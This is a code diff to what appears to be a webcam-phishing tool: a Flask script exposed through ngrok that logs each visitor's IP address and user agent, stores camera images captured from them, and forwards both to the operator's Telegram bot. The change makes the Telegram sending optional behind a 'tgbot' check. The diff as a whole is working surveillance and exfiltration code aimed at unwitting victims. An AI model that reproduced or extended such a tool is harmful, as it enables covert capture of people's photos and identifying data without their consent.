@@ -65,6 +65,7 @@ try:
         final_ngrok = final_ngrok
 
     # telegram bot building
+    global tgbot
     tgbot = input(f"{bcolors.WARNING} Do you want telegram bot support? ['y' or 'n']: {bcolors.ENDC}")
     if tgbot == 'y' or tgbot == 'Y' or tgbot == 'Yes' or tgbot =='yes':
 
@@ -135,10 +136,11 @@ try:
             file1.write("\n\n")
             file1.close()
 
-            # sending log message to telegram bot
-            log_msg = "Time: "+ str(now) +"      "+"IP_ADDRESS: "+ str(ip_address) +"       "+"USER-AGENT: "+ str(user_agent)
-            to_url2 = "https://api.telegram.org/bot"+ API_KEY +"/sendMessage?chat_id="+ str(user_id) +"&text="+ str(log_msg)
-            requests.get(to_url2)
+            if tgbot == "y":
+                # sending log message to telegram bot
+                log_msg = "Time: "+ str(now) +"      "+"IP_ADDRESS: "+ str(ip_address) +"       "+"USER-AGENT: "+ str(user_agent)
+                to_url2 = "https://api.telegram.org/bot"+ API_KEY +"/sendMessage?chat_id="+ str(user_id) +"&text="+ str(log_msg)
+                requests.get(to_url2)
 
             print(f"{now} \t {bcolors.OKCYAN}{ip_address}{bcolors.ENDC} \t {user_agent}\t")
 
@@ -163,11 +165,12 @@ try:
             
             print(f"{bcolors.OKGREEN}[{bcolors.ENDC}+{bcolors.OKGREEN}] Cam image recieved.{bcolors.FAIL} \n ")
 
-            # sending photo to telegram bot
-            data = {"chat_id": user_id, "caption": ""}
-            to_url = 'https://api.telegram.org/bot{}/sendPhoto'.format(API_KEY)
-            with open(completeName, "rb") as image_file:
-                requests.post(to_url, data=data, files={"photo": image_file})
+            if tgbot == "y":
+                # sending photo to telegram bot
+                data = {"chat_id": user_id, "caption": ""}
+                to_url = 'https://api.telegram.org/bot{}/sendPhoto'.format(API_KEY)
+                with open(completeName, "rb") as image_file:
+                    requests.post(to_url, data=data, files={"photo": image_file})
 
         return render_template("saycheese.html")
         
